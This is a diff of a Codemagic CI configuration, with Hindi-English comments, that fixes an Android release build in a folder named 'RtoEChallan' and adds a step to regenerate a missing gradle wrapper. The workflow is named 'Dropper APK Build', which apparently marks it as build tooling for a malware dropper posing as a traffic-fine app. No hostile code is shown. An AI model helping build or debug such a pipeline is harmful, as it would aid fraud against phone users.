@@ -1,4 +1,4 @@
-# Codemagic Automation - Sub-folder Fix
+# Codemagic Automation - Auto-Fix Gradle
 workflows:
   android-dropper-build:
     name: Dropper APK Build
@@ -11,21 +11,16 @@ workflows:
     scripts:
       - name: Build Android Release APK
         script: |
-          # 1. Sabse pehle sub-folder ke andar jao
           cd RtoEChallan
           
-          # 2. Check karo ki kya hum sahi jagah hain
-          ls -la
+          # Agar gradlew nahi hai toh naya generate karo
+          if [ ! -f "gradlew" ]; then
+            echo "Gradlew missing, generating new one..."
+            gradle wrapper
+          fi
           
-          # 3. Gradlew ko permission do aur build shuru karo
           chmod +x gradlew
           ./gradlew assembleRelease
 
     artifacts:
-      # Artifact path bhi sub-folder ke hisab se
-      - RtoEChallan/app/build/outputs/apk/release/*.apk
-
-    publishing:
-      scripts:
-        - name: Done
-          script: echo "Bhai, sub-folder wala masla hal ho gaya!"
+      - "RtoEChallan/app/build/outputs/apk/release/*.apk"
